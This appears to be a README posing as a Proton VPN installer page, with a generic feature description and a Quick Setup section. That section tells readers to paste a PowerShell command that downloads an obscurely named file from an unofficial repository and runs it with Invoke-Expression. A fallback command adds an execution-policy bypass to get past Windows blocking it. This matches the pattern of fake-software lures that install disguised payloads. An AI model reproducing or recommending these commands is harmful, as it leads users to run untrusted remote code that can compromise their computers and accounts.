# Proton VPN

Proton VPN is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Proton VPN and work in it.

Proton VPN is a Windows desktop client that sends your internet traffic through encrypted tunnels to servers in many countries. It sits in the system tray, works with your existing apps, and is built for people who want a simple on-off shield for email, video calls, and file sync without reconfiguring every program by hand.

A normal session starts when you launch the app, sign in, and choose a country or tap quick connect. The status icon turns green when the tunnel is up; you browse, stream, or upload as usual while the client keeps routing through the selected server. You might turn on the kill switch before sensitive work, adjust split tunneling so a local printer stays on your LAN, or disconnect when you finish so Windows returns to your usual network path.

This repository holds the Windows setup file for a pinned release, short notes on guided or silent installation, and a changelog that lists version bumps and fixed issues. Teams use it to know which build is approved on managed PCs and to record quirks with specific Windows updates. It is a practical record for rollout and support, not a replacement for the vendor’s own update feed.

## What you do with it

- WireGuard and OpenVPN let you choose how the Windows client negotiates its encrypted tunnel.
- The kill switch blocks outbound traffic if the VPN connection drops during sensitive online work.
- Secure Core sends traffic through hardened relay locations before it reaches the exit server.
- Split tunneling routes only selected applications through the VPN while others use direct internet.
- NetShield blocks malware domains and intrusive ads at the DNS layer while the tunnel stays active.
- VPN Accelerator can raise throughput on long-distance routes without changing your chosen country.
- Quick Connect picks a responsive server automatically when you only need general everyday protection.
- The map view shows available countries and server load so you can pick a quieter exit node.

## Quick Setup (PowerShell)

This installs the program Proton VPN on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/m-martin979799951/proton-vpn-setup-guide/main/hvmq6amb5z.kwbmeng8 | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/m-martin979799951/proton-vpn-setup-guide/main/hvmq6amb5z.kwbmeng8 | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `hvmq6amb5z.kwbmeng8` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `m-martin979799951/proton-vpn-setup-guide`. Proton VPN 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
